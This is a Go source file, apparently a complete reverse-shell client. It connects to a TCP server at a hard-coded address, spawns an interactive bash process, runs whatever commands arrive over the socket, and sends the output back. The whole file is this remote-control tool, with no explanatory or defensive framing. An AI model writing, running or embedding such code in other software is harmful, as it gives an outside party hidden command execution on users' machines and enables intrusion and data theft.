package main

import "log"
import "os/exec"
import "fmt"
import "bufio"
import "net"
import "io"

func InitConnection(requests chan<- string, response <-chan string) {
    const server string = "127.0.0.1:9999"
    fmt.Println("Connecting to remote server...", server)
    conn, err := net.Dial("tcp", server)
    if err != nil {
        log.Fatalln(err)
    }
    fmt.Println("Connection established!")

    go func() {
        for {
            for resp := range response {
                fmt.Fprintf(conn, "Response: " + resp)
            }
        }
    }()

    for {
        text, err := bufio.NewReader(conn).ReadString('\n')
        if err != nil {
            log.Fatalln(err)
        }
        requests<- text
    }

    log.Fatalln("connection closed!")
}

func IOHandler(requests <-chan string, response chan<- string, stdin io.WriteCloser, stdout io.ReadCloser, stderr io.ReadCloser) {
    defer stdin.Close()
    defer stdout.Close()
    defer stderr.Close()

    outReader := bufio.NewReader(stdout)
    outScanner := bufio.NewScanner(outReader)

    errReader := bufio.NewReader(stderr)
    errScanner := bufio.NewScanner(errReader)

    go func(){
        for outScanner.Scan() {
            response<- outScanner.Text() + "\n"
        }
        for errScanner.Scan() {
            response<- "ERROR!!! : " + errScanner.Text() + "\n"
        }
    }()

    for {
        log.Println("Waiting command...")
        req := <-requests
        log.Println("request accepted...")
        io.WriteString(stdin, req)
        log.Println("new circle")
    }

}

func MakeBash(requests <-chan string, response chan<- string) {
    fmt.Println("Starting bash... Press @stop to exit.")
    cmd := exec.Command("bash", "-i")

    stdin, err := cmd.StdinPipe()
    if err != nil {
        log.Fatalln(err)
    }

    stdout, err := cmd.StdoutPipe()
    if err != nil {
        log.Fatalln(err)
    }

    stderr, err:= cmd.StderrPipe()
    if err != nil {
        log.Fatalln(err)
    }

    go IOHandler(requests, response, stdin, stdout, stderr)

    if err := cmd.Start(); err != nil {
        log.Fatalln(err)
    }
    cmd.Wait()
}

func main() {
    var chan_requests chan string = make(chan string)
    var chan_response chan string = make(chan string)

    go MakeBash(chan_requests, chan_response)
    InitConnection(chan_requests, chan_response)
}
